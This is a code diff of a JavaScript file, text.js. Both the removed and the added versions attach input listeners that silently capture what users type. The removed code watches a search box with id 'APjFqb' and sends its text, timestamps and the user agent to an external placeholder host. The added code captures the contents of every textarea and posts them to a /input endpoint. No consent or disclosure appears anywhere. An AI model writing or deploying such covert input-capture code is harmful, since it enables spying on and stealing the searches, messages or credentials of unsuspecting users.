@@ -1,19 +1,19 @@
-const textarea = document.getElementById("APjFqb");
 console.log("text.js loaded");
-console.log(document.getElementById("APjFqb"));
 
-if (textarea) {
-  textarea.addEventListener("input", () => {
-    fetch("https://YOUR-RENDER-APP.onrender.com/input", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        text: textarea.value,
-        time: Date.now(),
-        ua: navigator.userAgent
-      })
-    });
-  });
-}
+document.addEventListener("input", e => {
+  if (!e.target) return;
+  if (e.target.tagName !== "TEXTAREA") return;
+
+  fetch("/input", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      text: e.target.value,
+      time: Date.now()
+    })
+  })
+  .then(r => console.log("POST /input", r.status))
+  .catch(err => console.error("fetch error", err));
+});
